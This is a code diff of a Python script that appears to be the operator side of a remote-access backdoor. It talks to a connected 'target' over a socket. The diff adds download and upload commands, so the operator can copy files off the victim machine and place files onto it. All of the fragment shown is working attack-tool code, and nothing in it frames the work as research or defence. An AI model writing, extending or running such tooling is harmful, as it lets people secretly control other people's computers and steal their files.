@@ -10,11 +10,27 @@ def reliable_recieve():
     data = ""
     while True:
         try:
-            chunk = target.recv(1024).decode('utf-8', errors='replace')
-            data += chunk
+            data += target.recv(1024).decode('utf-8', errors='replace')
             return json.loads(data)
         except ValueError:
             continue
+
+def download_file(filename):
+    f = open(filename,'wb')
+    target.settimeout(1)
+    chunk = target.recv(1024)
+    while chunk:
+        f.write(chunk)
+        try:
+            chunk = target.recv(1024)
+        except socket.timeout as e:
+            break
+    target.settimeout(None)
+    f.close()        
+
+def upload_file(filename):
+    f = open(filename,'rb')
+    target.send(f.read())
 
 def target_comm():
     while True:
@@ -26,6 +42,10 @@ def target_comm():
             pass
         elif command == 'clear':
             os.system('clear')
+        elif command[:8] == 'download':
+            download_file(command[9:])
+        elif command[:6] == 'upload':
+            upload_file(command[7:])
         else:
             result = reliable_recieve()
             print(result)
